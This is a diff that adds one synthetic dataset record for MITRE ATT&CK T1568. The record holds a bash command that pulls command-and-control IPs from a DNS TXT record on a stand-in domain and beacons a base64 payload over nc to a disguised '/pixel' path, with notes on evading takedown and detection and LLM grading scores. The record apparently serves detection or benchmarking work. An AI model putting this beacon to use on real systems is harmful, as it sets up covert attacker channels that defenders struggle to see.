@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"domain=cdn-status.example.net; txt=$(dig +short TXT \\\"$domain\\\" | tr -d '\\\"'); ip=$(printf '%s' \\\"$txt\\\" | tr , '\\n' | shuf -n1); host=static.example.net; ua=\\\"Mozilla/5.0 (X11; Linux)\\\"; payload=$(printf 'ping' | base64 -w0); body=\\\"d=$payload\\\"; printf 'POST /pixel HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$host\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Pulls an IP list from a DNS TXT record to dynamically select a C2 endpoint at runtime, then posts a base64 payload to a benign-looking path/pixel resource to blend in.",
+  "rationale_steps": [
+    "Use DNS TXT data to distribute and dynamically resolve C2 IPs.",
+    "Randomly select an IP for resilience against takedowns.",
+    "Imitate normal web beacons with a /pixel path and standard headers.",
+    "Send base64 content in a form-encoded body via nc over TCP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-ce0cc857",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and valid bash constructs/flags throughout; commands are properly chained and parseable on Linux.",
+        "semantic_score": 5,
+        "semantic_justification": "It queries a DNS TXT record to obtain a list of IPs and randomly selects one at runtime before sending an HTTP POST via nc, exemplifying dynamic endpoint resolution consistent with T1568.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:35:22.752503Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper variable expansions, correct use of semicolons as separators, valid flags for dig/tr/shuf/base64/nc, and properly escaped printf format strings.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by querying a DNS TXT record for a comma-separated IP list, randomly selecting one at runtime (endpoint rotation), then sending a base64-encoded payload via raw HTTP POST to a benign-looking path using nc, fully matching the described C2 technique with realistic operational plausibility.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:24:12.217922Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed bash string with balanced quotes, correct pipe usage, and valid utility flags.",
+        "semantic_score": 3,
+        "semantic_justification": "While the logic for dynamic endpoint resolution via DNS TXT records is operationally sound and aligns well with T1568, the use of double quotes for the bash -c wrapper causes the parent shell to expand variables (like $domain and $ip) before execution, resulting in an empty or broken command string at runtime.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:24:45.173422Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
